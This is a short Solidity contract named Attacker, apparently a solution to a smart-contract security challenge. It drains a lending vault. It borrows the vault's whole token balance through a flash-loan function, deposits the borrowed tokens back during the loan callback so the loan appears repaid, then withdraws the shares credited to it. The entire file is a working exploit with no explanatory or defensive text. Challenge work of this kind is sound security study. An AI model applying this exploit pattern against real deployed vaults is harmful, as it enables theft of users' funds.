// SPDX-License-Identifier:  None
pragma solidity ^0.8.0;

import "./vault.sol";

import "./token.sol";

contract Attacker {

    // Attacker2 attacker2;

    Vault vault;
    Token token;

    constructor( address vault_address, address token_address) {
        vault = Vault(vault_address);
        token = Token(token_address);
    }

    function attack() public  {

        uint256 value = token.balanceOf(address(vault));
        
        vault.flushLoan(value);
    
        vault.withdraw(vault.balanceOf(address(this)));
    }


    function onFlushLoan (address caller, uint256 amount) external  {
        require(caller == address(vault));
        token.approve(address(vault), amount);
        vault.deposit(amount);
        // token.transfer(caller, amount);
    }
}
